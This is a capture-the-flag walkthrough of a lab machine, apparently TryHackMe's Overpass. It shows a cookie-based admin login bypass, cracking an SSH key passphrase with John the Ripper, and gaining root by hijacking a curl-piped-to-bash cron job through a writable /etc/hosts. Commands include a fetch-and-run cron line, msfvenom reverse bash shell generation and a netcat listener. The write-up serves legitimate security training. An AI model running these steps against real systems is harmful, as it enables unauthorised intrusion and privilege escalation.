> ssh cracking

# Ports

* **80** : Golang net/http server
* **22** : OpenSSH 7.6p1

### Port 80, 22 are used for exploiting

# 80
1. We can get the source code for the password manager from the downloads page. Inspecting the shows that the password manager uses rot47 cypher to encrypt passwords.
2. `ffuf` gave us /admin and the page contains a login form.
3. `main.js` code for the login form says that the code checks for response from /api/login and assigns a cookie by using the `Cookie.set()` statement in main.js.
4. So we try to run the same statement in our browser console and check if a cookie is created for our session. `Cookie.set("hello")`
5. Reloading the page logs us in.

# 22
1. OpenSSH version 7.6

# EXPLOITATION

Logging into the /admin page shows a message for `james` listing his ssh private key.
We can use this private key to login by `ssh -i james_key james@10.10.10.10`
Which asks for a passphrase. So we need to crack this ssh private key for the password.

## John The Ripper
1. To crack the passphrase first we need to convert the private key to a format understood by `john`
`./ssh2john.py james_key > james_key_john`
2. Cracking using john
`./john james_key_john --wordlist=/usr/share/wordlist/rockyou.txt`
3. We obtain passphrase as `james13`.

We can now login as `james` user via ssh.

# Actions in the low privilege shell
1. In /home/james we can see a `todo.txt` which talks about an automated build script that is running on the system.
2. `cat /etc/crontab` shows the task `curl overpass.thm/downloads/src/buildscript.sh | bash` running as root user.
3. We can check the /etc/hosts to see that overpass.thm is pointing to  `127.0.0.1`. So if we can modify this ip address to ours we could execute malicious script to gain root.
4. `ls -la /etc/hosts` shows it is writable by the user. So we point `overpass.thm` to our attacker machine ip address and start a python server in our machine at port 80.
`python -m http.server 80` (attacker machine)
5. Now we create the /downloads/src/ directory structure to serve our modified `buildscript.sh`
6. So at first we create bash reverse shell using msfvenom
`msfvenom -p cmd/unix/reverse_bash LHOST=10.18.10.10 LPORT=4444`
8. The output from msfvenom is copied to our `buildscript.sh`
9. We set up a listener using netcat `nc -nvlp 4444`
10. We get the connection in a few seconds
  
We are now root.
